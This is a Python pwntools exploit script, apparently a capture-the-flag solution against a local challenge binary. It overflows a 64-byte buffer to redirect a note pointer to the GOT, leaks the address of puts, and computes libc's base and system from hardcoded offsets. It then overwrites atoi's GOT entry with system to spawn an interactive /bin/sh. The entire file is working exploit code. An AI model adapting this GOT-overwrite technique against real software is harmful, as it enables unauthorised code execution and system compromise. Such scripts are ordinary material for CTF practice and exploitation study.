from pwn import *

BUFF_SIZE = 64
bss = 0x0804C048

elf = ELF('./chall')
p = process('./chall')

def create():
	p.sendlineafter('> ', '1')

def read(idx):
	p.sendlineafter('> ', '2')
	p.sendlineafter('index: ', idx)
	p.recvuntil('content: ')
	return p.recvline()

def write(idx, payload):
	p.sendlineafter('> ', '3')
	p.sendlineafter('index: ', idx)
	p.sendlineafter('Your input: ', payload)

def delete(idx):
	p.sendlineafter('> ', '4')
	p.sendlineafter('index: ', idx)


# p.sendline('1')
# p.sendline(str(elf.got['puts']))
# print elf.got['puts']
# p.interactive()

create()
create()
payload = 'A'*BUFF_SIZE + p32(elf.got['puts'])
write('0', payload)
res = read('1').strip()
# print len(res)
# print repr(res)
addres_puts = u32(res[:4])
print elf.got['puts']

offset___libc_start_main_ret = 0x1e8b9
offset_system = 0x00042a60
offset_dup2 = 0x000edc40
offset_read = 0x000ecfb0
offset_write = 0x000ed050
offset_str_bin_sh = 0x184f68
offset_puts = 0x0006d770
offset_atoi = 0x00034380

libc_base = addres_puts - offset_puts
address_system = libc_base + offset_system

payload = 'A'*BUFF_SIZE + p32(elf.got['atoi'])
write('0', payload)
payload = p32(address_system)
write('1', payload)
p.sendline('/bin/sh')
p.interactive()